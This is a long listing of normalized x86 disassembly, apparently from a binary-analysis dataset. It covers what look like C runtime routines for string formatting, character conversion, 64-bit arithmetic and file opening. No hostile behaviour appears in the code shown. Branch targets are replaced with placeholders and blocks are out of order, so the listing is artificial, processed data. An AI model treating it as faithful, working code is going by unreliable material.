mov eax esi
mov edx ecx
mov [ ebp - 0x41c ] eax
mov [ ebp - 0x414 ] edx
test edi edi
jle r-xdata
mov esi [ rw-data ]
push eax
call sub_40f402
xor eax eax
pop ecx
mov [ ebp - 0x458 ] eax
push 0x20
pop ecx
test ebx 0x100
je r-xdata
jne r-xdata
mov [ ebp - 0x418 ] 0x6
jmp r-xdata
cmp eax 0x6e
je r-xdata
test ebx 0x9000
jne r-xdata
cmp edi eax
jg r-xdata
mov ecx [ edi - 0x4 ]
xor eax eax
mov edi eax
mov eax [ edi - 0x4 ]
movzx eax [ edi - 0x4 ]
jmp r-xdata
movsx eax [ edi - 0x4 ]
jmp r-xdata
mov esi [ rw-data ]
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
dec eax
dec eax
jne r-xdata
test ebx 0x830
jne r-xdata
dec eax
dec eax
je r-xdata
cmp eax 0x78
je r-xdata
sub edx esi
xor eax eax
mov al [ eax ]
test al al
je r-xdata
push [ ebp - 0x45c ]
lea ecx [ ebp - 0x420 ]
push ecx
push [ ebp - 0x428 ]
push eax
lea eax [ ebp - 0x438 ]
push eax
call sub_41319a
add esp 0x14
test bl 0x8
je r-xdata
lea eax [ ebp - 0x420 ]
push eax
push [ ebp - 0x428 ]
push edi
push ecx
call sub_41316e
mov eax [ ebp - 0x42c ]
add esp 0x10
test bl 0x1
je r-xdata
push 0x2d
cmp eax edx
jle r-xdata
push 0x67
pop eax
cmp cx ax
jne r-xdata
mov eax [ edi ]
add edi 0x8
mov [ ebp - 0x488 ] eax
mov eax [ edi - 0x4 ]
mov [ ebp - 0x484 ] eax
lea eax [ ebp - 0x44c ]
push eax
push [ ebp - 0x460 ]
movsx eax cl
push [ ebp - 0x418 ]
mov [ ebp - 0x40c ] edi
push eax
push [ ebp - 0x414 ]
lea eax [ ebp - 0x488 ]
push esi
push eax
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
mov edi ebx
add esp 0x1c
and edi 0x80
je r-xdata
add edi 0x4
mov [ ebp - 0x40c ] edi
mov edi [ edi - 0x4 ]
call sub_41996e
test eax eax
je r-xdata
push 0x6f
pop ecx
cmp eax ecx
jne r-xdata
mov edx [ ebp - 0x418 ]
test edx edx
jns r-xdata
mov edi eax
jl r-xdata
cdq
mov ecx eax
mov edi edx
mov [ ebp - 0x414 ] edx
test ebx 0x800
je r-xdata
movzx eax [ edi ]
add edi 0x4
mov [ ebp - 0x430 ] 0x1
mov [ ebp - 0x40c ] edi
mov [ ebp - 0x464 ] eax
test bl 0x20
je r-xdata
push 0x20
pop eax
or ebx eax
mov [ ebp - 0x410 ] ebx
jmp r-xdata
dec eax
dec eax
jne r-xdata
cmp ax [ ebp - 0x474 ]
je r-xdata
add edx 0x2
test edi edi
jne r-xdata
lea ecx [ ebp - 0x44c ]
movzx eax al
push ecx
push eax
call sub_416b3c
pop ecx
test eax eax
mov eax [ ebp - 0x41c ]
pop ecx
je r-xdata
cmp [ ebp - 0x430 ] 0x0
mov eax [ ebp - 0x414 ]
jne r-xdata
test bl 0x4
jne r-xdata
test bl 0x2
je r-xdata
push 0x2b
jmp r-xdata
cmp eax 0xa3
jle r-xdata
mov eax edx
mov [ ebp - 0x418 ] eax
mov [ ebp - 0x418 ] 0x1
jmp r-xdata
push 0x67
pop eax
cmp [ ebp - 0x41c ] ax
jne r-xdata
cmp [ ebp - 0x418 ] 0x0
jne r-xdata
call sub_412060
mov [ eax ] 0x16
call sub_412224
cmp [ ebp - 0x440 ] 0x0
je r-xdata
mov eax [ ebp - 0x420 ]
test bl 0x20
je r-xdata
mov [ ebp - 0x41c ] 0x8
test bl bl
jns r-xdata
and ebx 0xfffffff7
mov [ ebp - 0x410 ] ebx
cmp edx 0x200
jle r-xdata
xor edx edx
inc edx
jmp r-xdata
neg ecx
adc edi eax
neg edi
or ebx 0x100
mov [ ebp - 0x410 ] ebx
cmp ecx eax
jae r-xdata
movsx edx [ eax ]
xor ecx ecx
mov [ ebp - 0x430 ] ecx
jmp r-xdata
movsx eax [ eax ]
cdq
sub eax edx
mov edx eax
mov [ ebp - 0x430 ] 0x1
jmp r-xdata
mov [ ebp - 0x404 ] ax
mov [ ebp - 0x43c ] al
xor eax eax
mov [ ebp - 0x43b ] al
lea eax [ ebp - 0x44c ]
push eax
mov eax [ ebp - 0x44c ]
push [ eax + 0x74 ]
lea eax [ ebp - 0x43c ]
push eax
lea eax [ ebp - 0x404 ]
push eax
call sub_419b08
add esp 0x10
test eax eax
jns r-xdata
xor eax eax
mov [ ebp - 0x434 ] eax
dec edi
cmp [ edx ] ax
je r-xdata
mov edx [ ebp - 0x414 ]
inc eax
inc edx
mov [ ebp - 0x41c ] eax
mov [ ebp - 0x414 ] edx
cmp edx edi
jl r-xdata
inc eax
push [ ebp - 0x45c ]
lea ecx [ ebp - 0x420 ]
push ecx
push [ ebp - 0x428 ]
push eax
push esi
call sub_41319a
add esp 0x14
test eax eax
jle r-xdata
lea eax [ ebp - 0x420 ]
push eax
push [ ebp - 0x428 ]
push edi
push 0x30
pop eax
push eax
call sub_41316e
add esp 0x10
push 0x20
pop ecx
mov [ ebp - 0x438 ] cx
mov [ ebp - 0x42c ] 0x1
jmp r-xdata
pop eax
mov [ ebp - 0x438 ] ax
mov [ ebp - 0x42c ] 0x1
lea edi [ eax + 0x15d ]
push edi
call sub_411b1b
pop ecx
mov ecx [ ebp - 0x41c ]
mov [ ebp - 0x458 ] eax
test eax eax
je r-xdata
cmp [ esi ] 0x2d
jne r-xdata
test edi edi
jne r-xdata
lea eax [ ebp - 0x44c ]
push eax
push esi
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
pop ecx
pop ecx
mov ecx [ ebp - 0x444 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
mov [ edi ] eax
mov [ edi ] ax
jmp r-xdata
or ebx 0x200
mov [ ebp - 0x410 ] ebx
jmp r-xdata
mov eax ecx
or eax edi
jne r-xdata
mov edx 0x200
sar edx 0x1
xor edx edx
lea esi [ ebp - 0x404 ]
inc edx
jmp r-xdata
mov [ ebp - 0x450 ] 0x1
jmp r-xdata
jmp r-xdata
test bl 0x4
je r-xdata
mov ecx esi
mov [ ebp - 0x41c ] esi
mov edi [ ebp - 0x424 ]
mov eax [ ebp - 0x42c ]
sub edi edx
sub edi eax
test bl 0xc
jne r-xdata
mov [ ebp - 0x418 ] 0xa3
mov esi eax
mov [ ebp - 0x414 ] edi
jmp r-xdata
push esi
call sub_411260
pop ecx
mov edx eax
jmp r-xdata
or ebx 0x100
mov [ ebp - 0x410 ] ebx
inc esi
jmp r-xdata
lea eax [ ebp - 0x44c ]
push eax
push esi
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
pop ecx
pop ecx
mov [ ebp - 0x450 ] 0x1
jmp r-xdata
lea esi [ ebp - 0x205 ]
mov [ ebp - 0x42c ] eax
lea eax [ ebp - 0x420 ]
push eax
push [ ebp - 0x428 ]
push edi
push 0x20
pop eax
push eax
call sub_41316e
add esp 0x10
or eax 0xffffffff
mov [ ebp - 0x420 ] eax
jmp r-xdata
lea eax [ ebp - 0x420 ]
push eax
push [ ebp - 0x428 ]
push [ ebp - 0x464 ]
call sub_413138
mov ecx [ ebp - 0x41c ]
add ecx [ ebp - 0x478 ]
mov eax [ ebp - 0x46c ]
add esp 0xc
mov [ ebp - 0x41c ] ecx
test eax eax
jg r-xdata
mov edi [ ebp - 0x40c ]
mov eax [ ebp - 0x41c ]
cdq
push edx
push eax
push edi
push ecx
call sub_419c20
add ecx 0x30
mov [ ebp - 0x46c ] ebx
mov [ ebp - 0x414 ] eax
mov edi edx
cmp ecx 0x39
jle r-xdata
mov eax ecx
or eax edi
je r-xdata
test eax eax
js r-xdata
dec eax
mov [ ebp - 0x46c ] eax
lea eax [ ebp - 0x44c ]
push eax
mov eax [ ebp - 0x44c ]
push [ eax + 0x74 ]
lea eax [ ebp - 0x464 ]
push ecx
push eax
call sub_419b08
add esp 0x10
mov [ ebp - 0x478 ] eax
test eax eax
jle r-xdata
jmp r-xdata
mov edx [ ebp - 0x418 ]
mov [ esi ] cl
mov ecx [ ebp - 0x414 ]
dec esi
jmp r-xdata
add ecx [ ebp - 0x454 ]
mov ebx [ ebp - 0x410 ]
lea edx [ ebp - 0x205 ]
sub edx esi
inc esi
mov [ ebp - 0x414 ] edx
test ebx 0x200
je r-xdata
mov eax [ ebp - 0x420 ]
mov eax edx
dec edx
mov [ ebp - 0x418 ] edx
test eax eax
jg r-xdata
test edx edx
je r-xdata
dec esi
push 0x30
pop eax
mov [ esi ] al
inc edx
jmp r-xdata
cmp [ esi ] 0x30
je r-xdata
sub_419983
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
test [ edi + 0xc ] 0x40
jne r-xdata
add [ edi + 0x4 ] 0xfffffffe
js r-xdata
push edi
call sub_413a92
pop ecx
mov ebx rw-data
cmp eax 0xffffffff
je r-xdata
movzx eax [ ebp + 0x8 ]
push edi
push eax
call sub_41d428
pop ecx
pop ecx
mov ecx [ edi ]
mov eax [ ebp + 0x8 ]
mov [ ecx ] ax
add [ edi ] 0x2
jmp r-xdata
mov eax ebx
push edi
call sub_413a92
pop ecx
cmp eax 0xfffffffe
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40eb9e
leave
retn
push edi
call sub_413a92
pop ecx
cmp eax 0xffffffff
je r-xdata
push edi
call sub_413a92
mov esi eax
push edi
sar esi 0x5
call sub_413a92
and eax 0x1f
pop ecx
shl eax 0x6
add eax [ esi * 4 + rw-data ]
pop ecx
jmp r-xdata
mov eax ebx
push edi
call sub_413a92
pop ecx
cmp eax 0xfffffffe
je r-xdata
mov al [ eax + 0x24 ]
and al 0x7f
cmp al 0x2
je r-xdata
push edi
call sub_413a92
pop ecx
cmp eax 0xffffffff
je r-xdata
push edi
call sub_413a92
mov esi eax
push edi
sar esi 0x5
call sub_413a92
and eax 0x1f
pop ecx
shl eax 0x6
add eax [ esi * 4 + rw-data ]
pop ecx
jmp r-xdata
test [ ebx + 0x4 ] 0x80
je r-xdata
push edi
call sub_413a92
pop ecx
cmp eax 0xfffffffe
je r-xdata
mov al [ eax + 0x24 ]
and al 0x7f
cmp al 0x1
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0xc ]
push 0x5
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_41d40d
add esp 0x10
test eax eax
je r-xdata
push edi
call sub_413a92
mov esi eax
push edi
sar esi 0x5
call sub_413a92
mov ebx eax
and ebx 0x1f
pop ecx
shl ebx 0x6
add ebx [ esi * 4 + rw-data ]
pop ecx
xor esi esi
cmp [ ebp - 0x10 ] esi
jle r-xdata
mov eax 0xffff
jmp r-xdata
mov ax [ ebp + 0x8 ]
jmp r-xdata
dec [ edi + 0x4 ]
js r-xdata
movsx eax [ ebp + esi - 0xc ]
push edi
push eax
call sub_41225f
pop ecx
pop ecx
mov ecx eax
mov ecx [ edi ]
mov al [ ebp + esi - 0xc ]
mov [ ecx ] al
mov eax [ edi ]
movzx ecx [ eax ]
inc eax
mov [ edi ] eax
jmp r-xdata
inc esi
cmp esi [ ebp - 0x10 ]
jl r-xdata
cmp ecx 0xffffffff
je r-xdata
sub_419b08
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
test esi esi
je r-xdata
xor eax eax
mov ebx [ ebp + 0x10 ]
test ebx ebx
je r-xdata
cmp [ esi ] 0x0
jne r-xdata
push edi
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_410368
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xa8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
movzx eax [ esi ]
push eax
call sub_416b3c
pop ecx
pop ecx
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
xor ecx ecx
mov [ eax ] cx
xor eax eax
cmp [ ebp + 0x8 ] eax
setne al
xor edi edi
inc edi
push eax
push [ ebp + 0x8 ]
mov eax [ ebp - 0x10 ]
push edi
push esi
push 0x9
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
mov edi [ ebp - 0x10 ]
cmp [ edi + 0x74 ] 0x1
jle r-xdata
xor edi edi
inc edi
jmp r-xdata
movzx eax [ esi ]
mov [ ecx ] ax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_412060
or edi 0xffffffff
mov [ eax ] 0x2a
cmp ebx [ edi + 0x74 ]
cmp ebx [ edi + 0x74 ]
jl r-xdata
mov eax edi
pop edi
jmp r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ esi + 0x1 ] 0x0
je r-xdata
jb r-xdata
xor eax eax
cmp [ ebp + 0x8 ] eax
setne al
push eax
push [ ebp + 0x8 ]
push [ edi + 0x74 ]
push esi
push 0x9
push [ edi + 0x4 ]
call [ MultiByteToWideChar@IAT ]
mov edi [ ebp - 0x10 ]
test eax eax
jne r-xdata
pop esi
pop ebx
leave
retn
mov edi [ edi + 0x74 ]
jmp r-xdata
sub_419c20
push esi
mov eax [ esp + 0x14 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x8 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x10 ]
mov ecx eax
mov eax esi
mul [ esp + 0x10 ]
add edx ecx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x14 ]
mov ecx eax
mov eax [ esp + 0x10 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x8 ]
sbb edx [ esp + 0xc ]
neg edx
neg eax
sbb edx 0x0
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
pop esi
retn 0x10
dec esi
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
cmp edx [ esp + 0xc ]
ja r-xdata
jb r-xdata
xor ebx ebx
cmp eax [ esp + 0x8 ]
jbe r-xdata
sub_419cb5
push ebp
mov ebp esp
push ecx
mov ax [ ebp + 0x8 ]
mov ecx 0xffff
cmp ax cx
jne r-xdata
mov ecx 0x100
cmp ax cx
jae r-xdata
xor eax eax
leave
retn
lea eax [ ebp - 0x4 ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
push 0x1
call [ GetStringTypeW@IAT ]
neg eax
sbb eax eax
and eax [ ebp - 0x4 ]
movzx eax ax
movzx ecx ax
mov eax [ rw-data ]
movzx eax [ eax + ecx * 2 ]
jmp r-xdata
movzx ecx [ ebp + 0xc ]
and eax ecx
leave
retn
sub_419d07
push ebp
mov ebp esp
mov ax [ ebp + 0x8 ]
push 0x30
pop ecx
cmp ax cx
jb r-xdata
or eax 0xffffffff
pop ebp
retn
cmp ax 0x3a
jae r-xdata
mov edx 0xff10
cmp ax dx
jae r-xdata
movzx eax ax
sub eax ecx
pop ebp
retn
mov ecx 0xff1a
mov edx 0x660
cmp ax dx
jb r-xdata
movzx eax ax
sub eax edx
pop ebp
retn
lea ecx [ edx + 0xa ]
cmp ax cx
jae r-xdata
mov edx 0x6f0
cmp ax dx
jb r-xdata
lea ecx [ edx + 0xa ]
cmp ax cx
jb r-xdata
mov edx 0x966
cmp ax dx
jb r-xdata
lea ecx [ edx + 0xa ]
cmp ax cx
jb r-xdata
lea edx [ ecx + 0x76 ]
cmp ax dx
jb r-xdata
lea ecx [ edx + 0xa ]
cmp ax cx
jb r-xdata
lea edx [ ecx + 0x76 ]
cmp ax dx
jb r-xdata
lea ecx [ edx + 0xa ]
cmp ax cx
jb r-xdata
lea edx [ ecx + 0x76 ]
cmp ax dx
jb r-xdata
lea ecx [ edx + 0xa ]
cmp ax cx
jb r-xdata
lea edx [ ecx + 0x76 ]
cmp ax dx
jb r-xdata
lea ecx [ edx + 0xa ]
cmp ax cx
jb r-xdata
mov edx 0xc66
cmp ax dx
jb r-xdata
lea ecx [ edx + 0xa ]
cmp ax cx
jb r-xdata
lea edx [ ecx + 0x76 ]
cmp ax dx
jb r-xdata
lea ecx [ edx + 0xa ]
cmp ax cx
jb r-xdata
lea edx [ ecx + 0x76 ]
cmp ax dx
jb r-xdata
lea ecx [ edx + 0xa ]
cmp ax cx
jb r-xdata
mov edx 0xe50
cmp ax dx
jb r-xdata
lea ecx [ edx + 0xa ]
cmp ax cx
jb r-xdata
lea edx [ ecx + 0x76 ]
cmp ax dx
jb r-xdata
lea ecx [ edx + 0xa ]
cmp ax cx
jb r-xdata
add edx 0x50
cmp ax dx
jb r-xdata
add ecx 0x50
cmp ax cx
jb r-xdata
mov edx 0x1040
cmp ax dx
jb r-xdata
lea ecx [ edx + 0xa ]
cmp ax cx
jb r-xdata
mov edx 0x17e0
cmp ax dx
jb r-xdata
lea ecx [ edx + 0xa ]
cmp ax cx
jb r-xdata
add edx 0x30
cmp ax dx
jb r-xdata
add ecx 0x30
jmp r-xdata
cmp ax cx
jb r-xdata
sub_419eb0
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
or ecx eax
mov ecx [ esp + 0xc ]
jne r-xdata
push ebx
mul ecx
mov ebx eax
mov eax [ esp + 0x8 ]
mul [ esp + 0x14 ]
add ebx eax
mov eax [ esp + 0x8 ]
mul ecx
add edx ebx
pop ebx
retn 0x10
mov eax [ esp + 0x4 ]
mul ecx
retn 0x10
sub_419ee4
push 0x10
push r--data
call sub_411bb0
xor edi edi
mov [ ebp - 0x1c ] edi
push 0x1
call sub_416df0
pop ecx
and [ ebp - 0x4 ] edi
push 0x3
pop esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_419f78
mov eax edi
call sub_411bf5
retn
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
test eax eax
je r-xdata
inc esi
jmp r-xdata
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] esi
cmp esi [ rw-data ]
jge r-xdata
cmp esi 0x14
jl r-xdata
push eax
call sub_40f7be
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
add eax 0x20
push eax
call [ DeleteCriticalSection@IAT ]
mov eax [ rw-data ]
push [ eax + esi * 4 ]
call sub_40f402
pop ecx
mov eax [ rw-data ]
and [ eax + esi * 4 ] 0x0
inc edi
mov [ ebp - 0x1c ] edi
sub_419f81
push ebp
mov ebp esp
sub esp 0x1c
push esi
call sub_41592b
test eax eax
je r-xdata
mov esi [ ebp - 0x4 ]
push r--data
push r--data
call [ GetModuleHandleW@IAT ]
push eax
call [ GetProcAddress@IAT ]
mov esi eax
test esi esi
jne r-xdata
or eax [ ebp + 0x20 ]
push 0x0
push eax
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ CreateFileW@IAT ]
and [ ebp - 0x10 ] 0x0
and [ ebp - 0x8 ] 0x0
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x1c ]
push eax
push [ ebp + 0x18 ]
mov [ ebp - 0x1c ] 0x18
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
jmp r-xdata
call sub_41592b
test eax eax
mov eax [ ebp + 0x1c ]
je r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
leave
retn
sub_41a012
push 0x14
push r--data
call sub_411bb0
and [ ebp - 0x1c ] 0x0
xor eax eax
mov esi [ ebp + 0x18 ]
test esi esi
setne al
test eax eax
jne r-xdata
or [ esi ] 0xffffffff
xor eax eax
cmp [ ebp + 0x8 ] eax
setne al
test eax eax
je r-xdata
call sub_412060
push 0x16
pop esi
mov [ eax ] esi
call sub_412224
mov eax esi
jmp r-xdata
cmp [ ebp + 0x1c ] 0x0
je r-xdata
call sub_411bf5
retn
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x1c ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push esi
lea eax [ ebp - 0x1c ]
push eax
call sub_41a0d9
add esp 0x1c
mov edi eax
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41a0ad
test edi edi
je r-xdata
mov eax [ ebp + 0x14 ]
and eax 0xfffffe7f
neg eax
sbb eax eax
inc eax
je r-xdata
mov eax edi
or [ esi ] 0xffffffff
sub_41a0ad
cmp [ ebp - 0x1c ] 0x0
je r-xdata
retn
test edi edi
je r-xdata
push [ esi ]
call sub_41af07
pop ecx
mov ecx [ esi ]
mov eax ecx
sar eax 0x5
and ecx 0x1f
shl ecx 0x6
mov eax [ eax * 4 + rw-data ]
and [ eax + ecx + 0x4 ] 0xfe
sub_41a0d9
push ebp
mov ebp esp
sub esp 0x38
push ebx
xor ebx ebx
test [ ebp + 0x14 ] 0x80
push edi
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x2 ] bl
mov [ ebp - 0x38 ] 0xc
mov [ ebp - 0x34 ] ebx
je r-xdata
mov [ ebp - 0x30 ] 0x1
mov [ ebp - 0x1 ] bl
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x1 ] 0x10
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_412234
int3
mov ecx [ ebp + 0x14 ]
mov eax 0x8000
test eax ecx
jne r-xdata
lea eax [ ebp - 0x20 ]
push eax
call sub_41d73c
pop ecx
test eax eax
jne r-xdata
mov eax ecx
and eax 0x3
mov edx 0xc0000000
sub eax ebx
je r-xdata
test ecx 0x74000
jne r-xdata
mov edi 0x80000000
dec eax
je r-xdata
or [ ebp - 0x1 ] 0x80
cmp [ ebp - 0x20 ] eax
je r-xdata
mov [ ebp - 0xc ] ebx
sub eax esi
je r-xdata
test cl 0x8
je r-xdata
dec eax
je r-xdata
cmp eax 0x500
je r-xdata
je r-xdata
mov [ ebp - 0xc ] 0x1
jmp r-xdata
sub eax esi
je r-xdata
mov edi 0x40000000
jmp r-xdata
test ecx 0x70000
je r-xdata
mov edi edx
jmp r-xdata
call sub_41202c
mov [ eax ] ebx
mov eax [ ebp + 0xc ]
or [ eax ] 0xffffffff
call sub_412060
push 0x16
pop ebx
mov [ eax ] ebx
call sub_412224
mov eax ebx
jmp r-xdata
xor esi esi
inc esi
cmp eax 0x600
je r-xdata
push 0x3
test eax eax
je r-xdata
mov eax ecx
and eax 0x700
mov esi 0x400
cmp eax esi
jg r-xdata
mov [ ebp - 0xc ] edx
jmp r-xdata
sub eax esi
je r-xdata
mov [ ebp - 0x8 ] edi
mov edi edx
mov [ ebp - 0x8 ] edx
jmp r-xdata
pop edi
pop ebx
leave
retn
test cl 0x40
je r-xdata
mov eax [ rw-data ]
not eax
and eax [ ebp + 0x1c ]
test al al
mov eax ebx
js r-xdata
push 0x5
jmp r-xdata
cmp eax 0x700
je r-xdata
mov edx 0x80
mov eax ebx
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x10 ] eax
test ecx 0x100
je r-xdata
cmp eax 0x100
je r-xdata
mov [ ebp - 0xc ] 0x3
jmp r-xdata
sub eax 0x40
jne r-xdata
mov eax [ ebp + 0x18 ]
push esi
push 0x10
pop esi
push 0x2
pop edx
mov [ ebp - 0x28 ] edx
sub eax esi
je r-xdata
test ecx 0x1000
je r-xdata
or edi 0x10000
or [ ebp - 0xc ] 0x4
mov eax 0x4000000
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x8 ] edi
xor edx edx
inc edx
mov [ ebp - 0x18 ] edx
pop esi
jmp r-xdata
call sub_41202c
mov [ eax ] ebx
mov eax [ ebp + 0xc ]
or [ eax ] 0xffffffff
call sub_412060
push 0x16
pop ebx
mov [ eax ] ebx
call sub_412224
jmp r-xdata
push 0x4
jmp r-xdata
cmp eax 0x200
je r-xdata
cmp edi 0x80000000
sete al
mov [ ebp - 0xc ] eax
jmp r-xdata
test ecx 0x2000
je r-xdata
or edx 0x100
mov [ ebp - 0x18 ] edx
mov eax ebx
jmp r-xdata
cmp eax 0x300
jne r-xdata
test cl 0x20
je r-xdata
or eax 0x2000000
mov [ ebp - 0x10 ] eax
pop esi
mov esi edx
jmp r-xdata
test cl 0x10
je r-xdata
or eax 0x8000000
jmp r-xdata
call sub_41abf3
mov edi [ ebp + 0xc ]
mov [ edi ] eax
cmp eax 0xffffffff
jne r-xdata
or eax 0x10000000
mov [ ebp - 0x10 ] eax
push [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
push [ ebp - 0x18 ]
mov [ eax ] 0x1
push esi
lea eax [ ebp - 0x38 ]
push eax
push [ ebp - 0xc ]
push [ ebp - 0x8 ]
push [ ebp + 0x10 ]
call sub_419f81
add esp 0x1c
mov [ ebp - 0x1c ] eax
cmp eax 0xffffffff
jne r-xdata
call sub_41202c
mov [ eax ] ebx
or [ edi ] 0xffffffff
call sub_412060
mov [ eax ] 0x18
call sub_412060
mov eax [ eax ]
push eax
call [ GetFileType@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov edx 0xc0000000
mov eax ecx
and eax edx
cmp eax edx
jne r-xdata
cmp eax 0x2
jne r-xdata
mov ecx [ edi ]
mov eax ecx
sar eax 0x5
and ecx 0x1f
mov eax [ eax * 4 + rw-data ]
shl ecx 0x6
and [ eax + ecx + 0x4 ] 0xfe
call [ GetLastError@IAT ]
mov esi eax
push esi
call sub_41203f
pop ecx
push [ ebp - 0x1c ]
call [ CloseHandle@IAT ]
test esi esi
jne r-xdata
mov ecx [ edi ]
mov eax ecx
sar eax 0x5
and ecx 0x1f
mov eax [ eax * 4 + rw-data ]
shl ecx 0x6
and [ eax + ecx + 0x4 ] 0xfe
call [ GetLastError@IAT ]
push eax
call sub_41203f
test [ ebp + 0x14 ] 0x1
je r-xdata
cmp eax 0x3
jne r-xdata
or [ ebp - 0x1 ] 0x40
jmp r-xdata
call sub_412060
mov ebx [ eax ]
jmp r-xdata
call sub_412060
mov [ eax ] 0xd
jmp r-xdata
push [ ebp - 0x10 ]
lea eax [ ebp - 0x38 ]
push [ ebp - 0x18 ]
and ecx 0x7fffffff
push esi
push eax
push [ ebp - 0xc ]
mov [ ebp - 0x8 ] ecx
push ecx
push [ ebp + 0x10 ]
call sub_419f81
add esp 0x1c
mov [ ebp - 0x1c ] eax
cmp eax 0xffffffff
jne r-xdata
push [ ebp - 0x1c ]
push [ edi ]
call sub_41ae85
mov dl [ ebp - 0x1 ]
pop ecx
pop ecx
mov ecx [ edi ]
mov eax ecx
sar eax 0x5
and ecx 0x1f
mov eax [ eax * 4 + rw-data ]
shl ecx 0x6
or dl 0x1
mov [ eax + ecx + 0x4 ] dl
mov ecx [ edi ]
mov eax ecx
sar eax 0x5
and ecx 0x1f
mov eax [ eax * 4 + rw-data ]
shl ecx 0x6
mov [ ebp - 0x1 ] dl
and [ eax + ecx + 0x24 ] 0x80
mov ecx [ ebp + 0x14 ]
mov al dl
and al 0x48
mov [ ebp - 0x3 ] al
jne r-xdata
or [ ebp - 0x1 ] 0x8
test dl dl
jns r-xdata
test dl dl
jns r-xdata
mov edx [ edi ]
mov eax edx
sar eax 0x5
and edx 0x1f
mov ecx [ eax * 4 + rw-data ]
shl edx 0x6
mov al [ ecx + edx + 0x24 ]
xor al [ ebp - 0x2 ]
and al 0x7f
xor [ ecx + edx + 0x24 ] al
mov esi [ edi ]
mov ecx [ ebp + 0x14 ]
mov eax esi
sar eax 0x5
and esi 0x1f
mov edx [ eax * 4 + rw-data ]
shl esi 0x6
shr ecx 0x10
mov al [ edx + esi + 0x24 ]
shl cl 0x7
and al 0x7f
or cl al
mov [ edx + esi + 0x24 ] cl
mov ecx [ ebp + 0x14 ]
cmp [ ebp - 0x3 ] bl
jne r-xdata
test ecx 0x74000
jne r-xdata
test cl 0x2
je r-xdata
mov esi [ ebp - 0x8 ]
mov edx 0xc0000000
mov eax esi
and eax edx
cmp eax edx
jne r-xdata
test cl 0x8
je r-xdata
mov eax ecx
and eax 0x74000
cmp eax 0x4000
je r-xdata
mov eax [ ebp - 0x20 ]
and eax 0x74000
jne r-xdata
push 0x2
push 0xffffffff
push 0xffffffff
push [ edi ]
call sub_413d49
mov ecx eax
and ecx edx
add esp 0x10
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x14 ] edx
cmp ecx 0xffffffff
jne r-xdata
test cl 0x1
je r-xdata
mov ecx [ edi ]
mov eax ecx
sar eax 0x5
and ecx 0x1f
mov eax [ eax * 4 + rw-data ]
shl ecx 0x6
or [ eax + ecx + 0x4 ] 0x20
mov ecx [ ebp + 0x14 ]
mov [ ebp - 0x2 ] bl
cmp eax 0x10000
je r-xdata
or ecx eax
or ecx 0x4000
jmp r-xdata
push 0x1
lea eax [ ebp - 0x24 ]
push eax
push [ edi ]
mov [ ebp - 0x24 ] ebx
call sub_413ef3
add esp 0xc
test eax eax
jne r-xdata
call sub_41202c
cmp [ eax ] 0x83
je r-xdata
push [ ebp - 0x1c ]
call [ CloseHandle@IAT ]
push [ ebp - 0x10 ]
lea eax [ ebp - 0x38 ]
